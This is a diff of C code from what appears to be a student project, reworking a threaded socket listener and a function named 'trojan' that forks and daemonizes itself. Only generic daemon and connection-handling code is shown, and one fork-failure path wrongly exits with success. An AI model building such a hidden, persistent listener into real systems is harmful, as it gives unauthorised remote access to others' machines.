@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/01 15:20:54 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/05 15:26:40 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/05 16:39:59 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -29,23 +29,27 @@ static void		lock_file(t_env *e) {
 
 static void		loop(t_env *e)
 {
+	t_thread_params params;
+	pthread_attr_t thread_attr = thread_init();
 	char str[256];
 
-	t_thread_params params;
 	params.logs = e->f_logs;
 	params.total_connection = 0;
 	while (1)
 	{
+		pthread_t thread;
+
 		print_logs(e->f_logs, "Waiting for a new connection.");
 		if ((e->csock = accept(e->hsock, (struct sockaddr *)&e->haddr, &e->haddr_size)) == -1)
 			exit(1);
 		bzero(str, sizeof(str));
-		pthread_t thread;
+		get_client_ip(e);
 		params.sock = e->csock;
+		params.cli_ip = e->client_ip;
+		params.cli_port = e->client_port;
 		if (params.total_connection < MAX_CLIENTS)
 		{
 			params.total_connection++;
-			get_client_ip(e);
 			snprintf(str, sizeof(str), "Received new connection: %s:%d", e->client_ip, e->client_port);
 			print_logs(e->f_logs, str);
 		}
@@ -56,13 +60,11 @@ static void		loop(t_env *e)
 			close(e->csock);
 			continue;
 		}
-		fprintf(e->f_logs, "global = %d\n", params.total_connection);
-		if (pthread_create(&thread, NULL, connection_handler, &params) < 0)
+		if (pthread_create(&thread, &thread_attr, thread_handler, &params) < 0)
         {
 			print_logs(e->f_logs, "Could not create thread");
             continue;
         }
-		//pthread_join(thread, NULL);
 	}
 }
 
@@ -74,13 +76,13 @@ void			trojan(t_env *e)
 	process_id = fork();
 	if (process_id < 0)
 	{
-		printf("fork failed!\n");
-		exit(1);
+		fprintf(stderr, "fork failed!\n");
+		exit(EXIT_SUCCESS);
 	}
 	if (process_id > 0)
 	{
-		printf("process_id of child process %d \n", process_id);
-		exit(0);
+		fprintf(stderr, "process_id of child process %d \n", process_id);
+		exit(EXIT_SUCCESS);
 	}
 	umask(027);
 	sid = setsid();
